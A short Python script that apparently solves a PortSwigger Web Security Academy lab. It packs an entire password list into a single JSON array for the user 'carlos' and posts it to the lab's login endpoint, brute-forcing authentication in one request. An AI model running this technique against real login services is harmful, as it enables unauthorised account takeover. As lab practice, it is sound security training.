import requests

from rich.console import Console
from lxml import html

code_lab = "0abd0005038b31bcc02d155d00a0002f"  # input

SERVER = "https://" + code_lab + ".web-security-academy.net"


def convert_to_json():
    s = "{\"username\": \"carlos\", \"password\":[ "
    with open('password.txt') as f:
        for line in f:
            s += "\"" + line.strip() + "\","
    s = s[:-1]
    s += "]}"
    return s


console = Console()

session = requests.Session()
response = session.get(f"{SERVER}/login")
console.log(f"Status code: {response.status_code}")
html_document = html.fromstring(response.content)
passwords_json = convert_to_json()
print(passwords_json)
response = session.post(f"{SERVER}/login", data=convert_to_json())

console.log(f"{response.content}")
console.log(f"{response.status_code}")
